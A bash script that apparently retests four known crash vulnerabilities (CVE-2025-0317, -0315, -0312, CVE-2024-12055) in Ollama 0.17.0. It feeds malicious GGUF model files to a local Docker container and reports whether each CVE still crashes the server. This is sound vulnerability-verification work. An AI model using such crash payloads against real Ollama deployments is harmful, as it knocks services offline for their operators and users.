#!/bin/bash
# Retest 4 known-unfixed Ollama CVEs against v0.17.0
set -e

PORT=11460
CONTAINER=ollama-v0170-retest
DIR="$(cd "$(dirname "$0")" && pwd)"

RESULT_0317="SKIPPED"
RESULT_0315="SKIPPED"
RESULT_0312="SKIPPED"
RESULT_12055="SKIPPED"

echo "=============================================="
echo "Ollama v0.17.0 Vulnerability Retest"
echo "=============================================="

# Step 1: Generate GGUF payloads
echo ""
echo "[1/6] Generating malicious GGUF files..."
python3 "$DIR/create_all_gguf.py" "$DIR/poc"

# Step 2: Start Ollama
echo ""
echo "[2/6] Starting Ollama v0.17.0..."
cd "$DIR"
docker compose up -d
echo "Waiting 10s for Ollama to initialize..."
sleep 10

# Verify Ollama is running
if ! curl -sf "http://localhost:$PORT/api/version" > /dev/null 2>&1; then
    echo "ERROR: Ollama not responding on port $PORT"
    docker compose logs
    exit 1
fi
OLLAMA_VER=$(curl -sf "http://localhost:$PORT/api/version" | python3 -c "import sys,json; print(json.load(sys.stdin).get('version','unknown'))" 2>/dev/null || echo "unknown")
echo "Ollama version: $OLLAMA_VER"

# Step 3: Test CVE-2025-0317 (alignment=0, divide by zero)
echo ""
echo "=============================================="
echo "[3/6] Testing CVE-2025-0317 (alignment=0, div by zero)"
echo "=============================================="
docker exec $CONTAINER ollama create test-0317 -f /poc/Modelfile.cve-2025-0317 2>&1 || true
sleep 3
if curl -sf "http://localhost:$PORT/api/version" > /dev/null 2>&1; then
    echo "RESULT: Server still running (FIXED or different behavior)"
    RESULT_0317="NOT_CRASHED"
else
    echo "RESULT: Server crashed! CVE-2025-0317 is STILL UNFIXED"
    RESULT_0317="CRASHED"
    echo "Collecting logs..."
    docker compose logs --tail 30
    echo "Restarting Ollama for next test..."
    docker compose restart
    sleep 10
fi

# Step 4: Test CVE-2025-0315 (inflated dims, OOM)
echo ""
echo "=============================================="
echo "[4/6] Testing CVE-2025-0315 (inflated dims, unbounded alloc)"
echo "=============================================="
docker exec $CONTAINER ollama create test-0315 -f /poc/Modelfile.cve-2025-0315 2>&1 || true
sleep 5
if curl -sf "http://localhost:$PORT/api/version" > /dev/null 2>&1; then
    echo "RESULT: Server still running (FIXED or different behavior)"
    RESULT_0315="NOT_CRASHED"
else
    echo "RESULT: Server crashed! CVE-2025-0315 is STILL UNFIXED"
    RESULT_0315="CRASHED"
    echo "Collecting logs..."
    docker compose logs --tail 30
    echo "Restarting Ollama for next test..."
    docker compose restart
    sleep 10
fi

# Step 5: Test CVE-2025-0312 (zero-dim tensor, nil deref)
echo ""
echo "=============================================="
echo "[5/6] Testing CVE-2025-0312 (zero-dim tensor, nil ptr deref)"
echo "=============================================="
docker exec $CONTAINER ollama create test-0312 -f /poc/Modelfile.cve-2025-0312 2>&1 || true
sleep 3
if curl -sf "http://localhost:$PORT/api/version" > /dev/null 2>&1; then
    echo "RESULT: Server still running (FIXED or different behavior)"
    RESULT_0312="NOT_CRASHED"
else
    echo "RESULT: Server crashed! CVE-2025-0312 is STILL UNFIXED"
    RESULT_0312="CRASHED"
    echo "Collecting logs..."
    docker compose logs --tail 30
    echo "Restarting Ollama for next test..."
    docker compose restart
    sleep 10
fi

# Step 6: Test CVE-2024-12055 (alignment=0, readGGUFString)
echo ""
echo "=============================================="
echo "[6/6] Testing CVE-2024-12055 (alignment=0, unbounded readString)"
echo "=============================================="
docker exec $CONTAINER ollama create test-12055 -f /poc/Modelfile.cve-2024-12055 2>&1 || true
sleep 3
if curl -sf "http://localhost:$PORT/api/version" > /dev/null 2>&1; then
    echo "RESULT: Server still running (FIXED or different behavior)"
    RESULT_12055="NOT_CRASHED"
else
    echo "RESULT: Server crashed! CVE-2024-12055 is STILL UNFIXED"
    RESULT_12055="CRASHED"
    echo "Collecting logs..."
    docker compose logs --tail 30
fi

# Summary
echo ""
echo "=============================================="
echo "SUMMARY - Ollama $OLLAMA_VER"
echo "=============================================="
echo "  CVE-2025-0317  (div by zero):       $RESULT_0317"
echo "  CVE-2025-0315  (unbounded alloc):   $RESULT_0315"
echo "  CVE-2025-0312  (nil ptr deref):     $RESULT_0312"
echo "  CVE-2024-12055 (unbounded string):  $RESULT_12055"

echo ""
echo "Stopping container..."
docker compose down -v
echo "Done."
